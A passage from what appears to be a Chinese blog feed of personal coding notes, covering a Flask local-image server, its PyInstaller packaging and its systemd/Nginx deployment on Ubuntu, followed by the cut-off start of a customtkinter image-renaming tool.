class="hljs-string">&#x27;/image/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_image</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> name == <span class="hljs-string">&#x27;random&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_map:<br>            abort(<span class="hljs-number">404</span>)<br>        filename = random.choice(<span class="hljs-built_in">list</span>(image_map.values()))<br>        <span class="hljs-keyword">return</span> send_from_directory(IMAGE_FOLDER, filename)<br>    <span class="hljs-keyword">else</span>:<br>        filename = image_map.get(name)<br>        <span class="hljs-keyword">if</span> filename:<br>            <span class="hljs-keyword">return</span> send_from_directory(IMAGE_FOLDER, filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">404</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 启动时先扫描一次图片</span><br>    image_map = load_images()<br>    <span class="hljs-comment"># 启动定时刷新任务，300秒即5分钟</span><br>    refresh_images_periodically(<span class="hljs-number">300</span>)<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>安装 flask 依赖：</li></ol></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install flask -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><hr><h2 id="3-打包为-exe"><a href="#3-打包为-exe" class="headerlink" title="3. 打包为 exe"></a>3. 打包为 exe</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller <span class="hljs-operator">-</span>-onefile <span class="hljs-operator">-</span>-windowed <span class="hljs-operator">-</span>-icon<span class="hljs-operator">=</span><span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\I</span>CO<span class="hljs-char escape_">\本</span>地图库.ico&quot;</span> <span class="hljs-operator">-</span>-distpath <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合&quot;</span> <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\本</span>地图库.py&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath &quot;</span>D:\文件集合\<span class="hljs-string">&quot;  &quot;</span>D:\文件集合\本地图库.py<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>是输出位置</span><br><span class="hljs-string">2. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\本</span>地图库.py 是输入位置</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-获取本地图库中的图片"><a href="#5-获取本地图库中的图片" class="headerlink" title="5. 获取本地图库中的图片"></a>5. 获取本地图库中的图片</h2><p>访问：</p><ol><li><a href="http://127.0.0.1:5000/image/image-name">http://127.0.0.1:5000/image/image-name</a></li><li><a href="http://127.0.0.1:5000/image/random">http://127.0.0.1:5000/image/random</a></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>无需带后缀，例如 <code>.jpg</code>、<code>.png</code> 等</li></ol></blockquote><hr><p>下面给你一套通用的方案，把你的 Flask 脚本上传到 Ubuntu 云服务器并且实现开机自启动。</p><hr><h2 id="一、把脚本和图片目录传到云服务器"><a href="#一、把脚本和图片目录传到云服务器" class="headerlink" title="一、把脚本和图片目录传到云服务器"></a>一、把脚本和图片目录传到云服务器</h2><ol><li><p><strong>打包代码</strong>（在本地）</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> D:\文件集合\本地图库<br>rem 假设你的脚本叫 image_server.py，打包成 zip<br>powershell Compress-Archive -Path image_server.py -DestinationPath image_server.zip<br></code></pre></td></tr></table></figure></li><li><p><strong>用 SCP 上传到云服务器</strong>（在本地 PowerShell 或 CMD）</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp image_server.zip root@117.72.211.221:/home/root/<br></code></pre></td></tr></table></figure></li><li><p><strong>解压并调整路径</strong>（在云服务器）</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/root<br>unzip image_server.zip<br><span class="hljs-built_in">mv</span> 本地图库 /home/root/images          <span class="hljs-comment"># 把 Windows 路径改成 Linux 目录</span><br>sed -i <span class="hljs-string">&#x27;s|IMAGE_FOLDER = .\+|IMAGE_FOLDER = r&quot;/home/root/images&quot;|&#x27;</span> image_server.py<br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="二、配置-Python-环境"><a href="#二、配置-Python-环境" class="headerlink" title="二、配置 Python 环境"></a>二、配置 Python 环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 Python3 与 venv</span><br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install -y python3 python3-venv<br><br><span class="hljs-comment"># 进入项目目录，创建虚拟环境</span><br><br><br><span class="hljs-built_in">cd</span> /home/root<br>python3 -m venv venv<br><span class="hljs-built_in">source</span> venv/bin/activate<br><br><span class="hljs-comment"># 安装依赖</span><br>pip install flask<br></code></pre></td></tr></table></figure><p>测试脚本能跑通：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python image_server.py<br><span class="hljs-comment"># 浏览器或 curl http://127.0.0.1:5000/image/random</span><br></code></pre></td></tr></table></figure><p>确认返回图片正常后，按下一步。</p><hr><h2 id="三、用-systemd-把它做成服务，随开机启动"><a href="#三、用-systemd-把它做成服务，随开机启动" class="headerlink" title="三、用 systemd 把它做成服务，随开机启动"></a>三、用 systemd 把它做成服务，随开机启动</h2><ol><li><strong>创建 systemd 单元文件</strong><br> 编辑 <code>/etc/systemd/system/images.service</code>，内容如下（确保路径和用户都换成实际值）：</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flask Image Server<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">WorkingDirectory</span>=/home/root<br><span class="hljs-attr">User</span>=root<br><span class="hljs-comment"># 激活虚拟环境并运行脚本</span><br><span class="hljs-attr">ExecStart</span>=/home/root/venv/bin/python /home/root/image_server.py<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><span class="hljs-attr">RestartSec</span>=<span class="hljs-number">5</span>s<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>让 systemd 识别并启动</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> images.service<br><span class="hljs-built_in">sudo</span> systemctl start images.service<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>检查状态 &amp; 日志</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status image_server.service<br><span class="hljs-built_in">sudo</span> journalctl -u image_server.service -f<br></code></pre></td></tr></table></figure><hr><h3 id="四、（可选）使用-Gunicorn-Nginx-提升稳定性"><a href="#四、（可选）使用-Gunicorn-Nginx-提升稳定性" class="headerlink" title="四、（可选）使用 Gunicorn + Nginx 提升稳定性"></a>四、（可选）使用 Gunicorn + Nginx 提升稳定性</h3><p>如果你后续想放到公网并承载更高并发，建议用 [Gunicorn] + [Nginx]：</p><ol><li><p><code>pip install gunicorn</code></p></li><li><p>在 systemd 的 <code>ExecStart</code> 改成：</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ExecStart</span>=/home/root/venv/bin/gunicorn -w <span class="hljs-number">4</span> -b <span class="hljs-number">127.0.0.1:5000</span> image_server:app<br></code></pre></td></tr></table></figure><ol start="3"><li>配置 Nginx 反向代理 <code>/etc/nginx/sites-available/image_server</code>：</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> your.domain.com;<br><br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br><span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code class="hljs">然后 `sudo ln -s … &amp;&amp; sudo nginx -t &amp;&amp; sudo systemctl reload nginx`。</code></pre><hr><p>这样，每次服务器重启后，你的 Flask 程序都会自动启动并监听 <code>127.0.0.1:5000</code>（或通过 Nginx 暴露）。如果有疑问，随时告诉我！</p><p>下面按照你最新的目录结构，给出一套完整的操作流程（Word 式标准步骤，不使用 Markdown）：</p><ol><li>修改脚本中图片目录路径<br> 1.1 用编辑器打开 <code>/mystudy/images/images.py</code><br> 1.2 将文件顶部的</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">IMAGE_FOLDER = <span class="hljs-string">r&#x27;D:\文件集合\本地图库&#x27;</span><br></code></pre></td></tr></table></figure><p>改为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">IMAGE_FOLDER</span> = <span class="hljs-string">&#x27;/mystudy/images/images&#x27;</span><br></code></pre></td></tr></table></figure><p>1.3 保存并退出</p><ol start="2"><li><p>准备 Python 虚拟环境<br> 2.1 在服务器上切换到脚本目录<br> cd &#x2F;mystudy&#x2F;images<br> 2.2 创建并激活虚拟环境<br> python3 -m venv venv<br> source venv&#x2F;bin&#x2F;activate<br> 2.3 安装依赖<br> pip install flask</p></li><li><p>本地运行测试<br> 3.1 确认脚本能正确启动<br> python images.py<br> 3.2 在另一终端执行<br> curl <a href="http://127.0.0.1:5000/image/random">http://127.0.0.1:5000/image/random</a><br> ——若能返回图片，说明一切正常<br> 3.3 按 Ctrl-C 停止服务</p></li><li><p>为脚本创建 systemd 服务<br> 4.1 新建文件 <code>/etc/systemd/system/images.service</code>，内容如下（请逐字复制）</p></li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flask Image Server<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">WorkingDirectory</span>=/mystudy/images<br><span class="hljs-attr">User</span>=root<br><span class="hljs-attr">ExecStart</span>=/mystudy/images/venv/bin/python /mystudy/images/images.py<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><span class="hljs-attr">RestartSec</span>=<span class="hljs-number">5</span>s<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>4.2 保存后执行<br>systemctl daemon-reload<br>systemctl enable images.service<br>systemctl start images.service</p><ol start="5"><li>验证服务状态<br>5.1 查看运行状态<br>systemctl status images.service<br>——应显示 Active: active (running)<br>5.2 查看实时日志<br>journalctl -u images.service -f<br>5.3 浏览器或 curl 测试<br>curl <a href="http://127.0.0.1:5000/image/random">http://127.0.0.1:5000/image/random</a></li></ol><p>完成以上步骤后，每次服务器重启，Flask 脚本都会自动启动并监听本机 5000 端口。</p><p>非常好，现在你的 Flask 服务已经 <strong>成功启动并由 systemd 托管</strong>，状态信息显示一切正常：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Active: <span class="hljs-built_in">active</span> (running)<br>* Running on http:<span class="hljs-comment">//127.0.0.1:5000</span><br></code></pre></td></tr></table></figure><h3 id="✅-下一步检查"><a href="#✅-下一步检查" class="headerlink" title="✅ 下一步检查"></a>✅ 下一步检查</h3><p>你可以在云服务器上试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://127.0.0.1:5000/image/random<br></code></pre></td></tr></table></figure><p>如果你看到一大串乱码（二进制图片），说明服务正常。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">root@lavm<span class="hljs-number">-2</span>xqib0dtxy:~<span class="hljs-comment"># curl http://127.0.0.1:5000/image/random</span><br>Warning: Binary output can mess up your terminal. Use <span class="hljs-string">&quot;--output -&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">tell</span> <br>Warning: curl <span class="hljs-keyword">to</span> output <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span> your terminal anyway, <span class="hljs-keyword">or</span> consider <span class="hljs-string">&quot;--output </span><br><span class="hljs-string">Warning: &lt;FILE&gt;&quot;</span> <span class="hljs-keyword">to</span> save <span class="hljs-keyword">to</span> a <span class="hljs-built_in">file</span>.<br><br></code></pre></td></tr></table></figure><hr><h3 id="🌐-如果你想让外部访问这个服务，有两个选项："><a href="#🌐-如果你想让外部访问这个服务，有两个选项：" class="headerlink" title="🌐 如果你想让外部访问这个服务，有两个选项："></a>🌐 如果你想让外部访问这个服务，有两个选项：</h3><h4 id="✅-方式-1：修改-Flask-监听公网"><a href="#✅-方式-1：修改-Flask-监听公网" class="headerlink" title="✅ 方式 1：修改 Flask 监听公网"></a>✅ 方式 1：修改 Flask 监听公网</h4><ol><li><p>修改 <code>/mystudy/images/images.py</code>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure></li><li><p>重启服务：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart images.service<br></code></pre></td></tr></table></figure></li><li><p>确保你的云服务器防火墙&#x2F;安全组已开放 <strong>5000端口（TCP）</strong>，你可以用：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw allow 5000/tcp<br></code></pre></td></tr></table></figure></li><li><p>现在你可以在任意机器上访问：</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>你的云服务器IP:<span class="hljs-number">5000</span><span class="hljs-regexp">/image/</span>random<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="✅-方式-2：保留内网监听-用-Nginx-转发（推荐）"><a href="#✅-方式-2：保留内网监听-用-Nginx-转发（推荐）" class="headerlink" title="✅ 方式 2：保留内网监听 + 用 Nginx 转发（推荐）"></a>✅ 方式 2：保留内网监听 + 用 Nginx 转发（推荐）</h4><p>更安全、专业的做法是：</p><ol><li><p>Flask 保持监听 127.0.0.1:5000（不用修改）</p></li><li><p>安装并配置 Nginx 转发外部请求到 Flask：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install nginx<br></code></pre></td></tr></table></figure></li><li><p>编辑配置文件 <code>/etc/nginx/sites-available/images</code>：</p> <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> your_domain_or_ip;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>启用站点并重启 Nginx：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -s /etc/nginx/sites-available/images /etc/nginx/sites-enabled/<br><span class="hljs-built_in">sudo</span> nginx -t<br><span class="hljs-built_in">sudo</span> systemctl reload nginx<br></code></pre></td></tr></table></figure></li></ol><p>然后你就可以通过：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//你的云服务器IP/</span><br></code></pre></td></tr></table></figure><p>来访问 Flask 提供的服务了。</p><hr><p>你目前的部署状态已经 90% 完成，下一步就看你是希望「公网访问图片」，还是「本地脚本调用」来做什么用，如果需要我可以帮你继续优化部署结构。要不要我顺便也把 Gunicorn&#x2F;Nginx 一起给你配置好？</p><p>访问： <a href="http://117.72.211.221:5000/image/random">http://117.72.211.221:5000/image/random</a></p>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>本地图库小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：重命名排序小工具</title>
    <link href="/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E9%87%8D%E5%91%BD%E5%90%8D%E6%8E%92%E5%BA%8F%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E9%87%8D%E5%91%BD%E5%90%8D%E6%8E%92%E5%BA%8F%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Py-代码"><a href="#1-Py-代码" class="headerlink" title="1. Py 代码"></a>1. Py 代码</h2><p>创建 <code>重命名排序.py</code> 并编写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><span class="hljs-keyword">import</span> customtkinter <span class="hljs-keyword">as</span> ctk<br><span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> filedialog, messagebox<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageRenamerApp</span>(ctk.CTk):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-variable language_">self</span>.title(<span class="hljs-string">&quot;图片顺序重命名工具&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.geometry(<span class="hljs-string">&quot;600x200&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.resizable(<span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.folder_path = ctk.StringVar()<br><br>        <span class="hljs-comment"># Set modern theme</span><br>        ctk.set_appearance_mode(<span class="hljs-string">&quot;dark&quot;</span>)  <span class="hljs-comment"># Options: &quot;light&quot;, &quot;dark&quot;, &quot;system&quot;</span><br>        ctk.set_default_color_theme(<span class="hljs-string">&quot;blue&quot;</span>)  <span class="hljs-comment"># Options: &quot;blue&quot;, &quot;green&quot;, &quot;dark-blue&quot;</span><br><br>        <span class="hljs-variable language_">self</span>.create_widgets()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_widgets</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># Main frame with padding</span><br>        frame = ctk.CTkFrame(<span class="hljs-variable language_">self</span>, corner_radius=<span class="hljs-number">10</span>)<br>        frame.pack(padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">20</span>, fill=ctk.BOTH, expand=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-comment"># Label</span><br>        label = ctk.CTkLabel(frame, text=<span class="hljs-string">&quot;请选择要重命名的文件夹：&quot;</span>, font=(<span class="hljs-string">&quot;Arial&quot;</span>, <span class="hljs-number">14</span>))<br>        label.pack(anchor=ctk.W, pady=(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>))<br><br>        <span class="hljs-comment"># Entry for folder path</span><br>        entry = ctk.CTkEntry(frame, textvariable=<span class="hljs-variable language_">self</span>.folder_path, width=<span class="hljs-number">400</span>, state=<span class="hljs-string">&quot;readonly&quot;</span>, font=(<span class="hljs-string">&quot;Arial&quot;</span>, <span class="hljs-number">12</span>))<br>        entry.pack(anchor=ctk.W, pady=(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>))<br><br>        <span class="hljs-comment"># Buttons frame</span><br>        btn_frame = ctk.CTkFrame(frame, fg_color=<span class="hljs-string">&quot;transparent&quot;</span>)<br>        btn_frame.pack(anchor=ctk.W)<br><br>        <span class="hljs-comment"># Select folder button</span><br>        btn_select = ctk.CTkButton(btn_frame, text=<span class="hljs-string">&quot;选择文件夹&quot;</span>, command=<span class="hljs-variable language_">self</span>.select_folder, width=<span class="hljs-number">120</span>, height=<span class="hljs-number">40</span>, corner_radius=<span class="hljs-number">8</span>, font=(<span class="hljs-string">&quot;Arial&quot;</span>, <span class="hljs-number">14</span>))<br>        btn_select.pack(side=ctk.LEFT, padx=(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>))<br><br>        <span class="hljs-comment"># Rename button (initially disabled)</span><br>        <span class="hljs-variable language_">self</span>.btn_sort = ctk.CTkButton(btn_frame, text=<span class="hljs-string">&quot;开始排序&quot;</span>, command=<span class="hljs-variable language_">self</span>.rename_images_sequentially, width=<span class="hljs-number">120</span>, height=<span class="hljs-number">40</span>, corner_radius=<span class="hljs-number">8</span>, font=(<span class="hljs-string">&quot;Arial&quot;</span>, <span class="hljs-number">14</span>), state=<span class="hljs-string">&quot;disabled&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.btn_sort.pack(side=ctk.LEFT)<br><br>        <span class="hljs-comment"># Feedback label</span><br>        <span class="hljs-variable language_">self</span>.feedback_label = ctk.CTkLabel(frame, text=<span class="hljs-string">&quot;&quot;</span>, font=(<span class="hljs-string">&quot;Arial&quot;</span>, <span class="hljs-number">12</span>), text_color=<span class="hljs-string">&quot;gray&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.feedback_label.pack(anchor=ctk.W, pady=(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_folder</span>(<span class="hljs-params">self</span>):<br>        path = filedialog.askdirectory(title=<span class="hljs-string">&quot;选择文件夹&quot;</span>)<br>        <span class="hljs-keyword">if</span> path:<br>            <span class="hljs-variable language_">self</span>.folder_path.<span class="hljs-built_in">set</span>(path)<br>            <span class="hljs-variable language_">self</span>.btn_sort.configure(state=<span class="hljs-string">&quot;normal&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.feedback_label.configure(text=<span class="hljs-string">f&quot;已选择文件夹：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>, text_color=<span class="hljs-string">&quot;green&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rename_images_sequentially</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.btn_sort.configure(state=<span class="hljs-string">&quot;disabled&quot;</span>)  <span class="hljs-comment"># Disable button during operation</span><br>        <span class="hljs-variable language_">self</span>.feedback_label.configure(text=<span class="hljs-string">&quot;正在重命名，请稍候...&quot;</span>, text_color=<span class="hljs-string">&quot;yellow&quot;</span>)<br><br>        folder = Path(<span class="hljs-variable language_">self</span>.folder_path.get())<br>        valid_exts = &#123;<span class="hljs-string">&#x27;.jpg&#x27;</span>, <span class="hljs-string">&#x27;.jpeg&#x27;</span>, <span 